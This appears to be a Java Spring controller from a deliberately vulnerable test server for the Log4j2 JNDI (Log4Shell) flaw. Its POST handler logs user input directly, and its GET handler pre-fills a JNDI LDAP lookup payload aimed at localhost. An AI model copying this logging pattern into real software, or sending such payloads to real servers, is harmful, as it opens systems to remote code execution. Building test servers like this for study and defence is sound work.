package de.gramou.log4j2vulnserver;

import javax.servlet.http.HttpServletRequest;
import org.apache.commons.lang3.StringUtils;
import org.apache.commons.lang3.exception.ExceptionUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.stereotype.Controller;
import org.springframework.ui.ModelMap;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.servlet.ModelAndView;

@Controller
@RequestMapping(path = {"/"})
public class IndexController {

  private static final String START_PAGE = "/index";

  private static final String LOG4J2_VULN_PARAM = "log4j2VulnParam";
  private static final String STACKTRACE_PARAM = "stacktraceParam";


  private static final Logger logger = LogManager.getLogger(IndexController.class);

  @RequestMapping(method = RequestMethod.GET)
  public ModelAndView get(HttpServletRequest request, String log4j2VulnParam) throws Exception {
    final ModelMap modelMap = new ModelMap();

    if (StringUtils.isEmpty(log4j2VulnParam)) {
      log4j2VulnParam = "${jndi:ldap://127.0.0.1:8888/a}";
    }

    modelMap.addAttribute(LOG4J2_VULN_PARAM, log4j2VulnParam);
    return new ModelAndView(START_PAGE, modelMap);
  }

  @RequestMapping(method = RequestMethod.POST)
  public ModelAndView post(HttpServletRequest request, String log4j2VulnParam) throws Exception {
    final ModelMap modelMap = new ModelMap();

    modelMap.addAttribute(LOG4J2_VULN_PARAM, log4j2VulnParam);
    try {
      logger.info("vuln log {}", log4j2VulnParam);
    } catch (RuntimeException ex) {

      modelMap.addAttribute(LOG4J2_VULN_PARAM, ExceptionUtils.getStackTrace(ex));

    }
    return new ModelAndView(START_PAGE, modelMap);
  }

}
